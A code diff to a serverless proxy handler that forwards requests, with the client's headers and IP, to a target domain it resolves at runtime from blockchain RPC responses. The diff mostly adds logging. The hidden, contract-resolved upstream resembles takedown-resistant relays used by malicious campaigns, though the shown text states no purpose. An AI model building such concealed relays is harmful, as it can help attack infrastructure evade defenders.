@@ -17,21 +17,28 @@ export default async function handler(req, res) {
         return res.status(204).end();
     }
 
-    const endpoint = req.query.e;
+    // Accept both ?e=endpoint and direct path /endpoint
+    const endpoint = req.query.e || req.url.replace(/^\//, '');
+    console.log("Incoming endpoint:", endpoint);
+
     if (!endpoint) {
+        console.log("Error: Missing endpoint");
         return res.status(400).send('Missing endpoint');
     }
 
+    // Ping test
     if (endpoint === 'ping_proxy') {
+        console.log("Ping received");
         return res.status(200).type('text/plain').send('pong');
     }
 
     try {
         const targetDomain = await fetchTargetDomain();
-        const url = `${targetDomain.replace(/\/$/, '')}/${endpoint.replace(/^\//, '')}`;
-        const clientIP = getClientIP(req);
+        const cleanDomain = targetDomain.replace(/\/$/, '');
+        const url = `${cleanDomain}/${endpoint.replace(/^\//, '')}`;
+        console.log(`Forwarding to: ${url}`);
 
-        // copy headers & inject IP
+        const clientIP = getClientIP(req);
         const headers = { ...req.headers };
         delete headers.host;
         delete headers.origin;
@@ -52,8 +59,10 @@ export default async function handler(req, res) {
         if (contentType) res.setHeader('Content-Type', contentType);
 
         const buffer = Buffer.from(await proxyResponse.arrayBuffer());
+        console.log(`Response from target: ${proxyResponse.status}`);
         res.status(proxyResponse.status).send(buffer);
     } catch (err) {
+        console.error("Proxy error:", err.message);
         res.status(500).send('error: ' + err.message);
     }
 }
@@ -76,6 +85,7 @@ async function fetchTargetDomain() {
     const data = '20965255';
     for (const rpcUrl of rpcUrls) {
         try {
+            console.log(`Querying RPC: ${rpcUrl}`);
             const response = await fetch(rpcUrl, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -90,10 +100,13 @@ async function fetchTargetDomain() {
             const result = await response.json();
             if (!result.error) {
                 const domain = hexToString(result.result);
-                if (domain) return domain;
+                if (domain) {
+                    console.log("Target domain resolved:", domain);
+                    return domain;
+                }
             }
         } catch (e) {
-            // try next RPC
+            console.log(`RPC failed: ${rpcUrl}`, e.message);
         }
     }
     throw new Error('Could not fetch target domain');
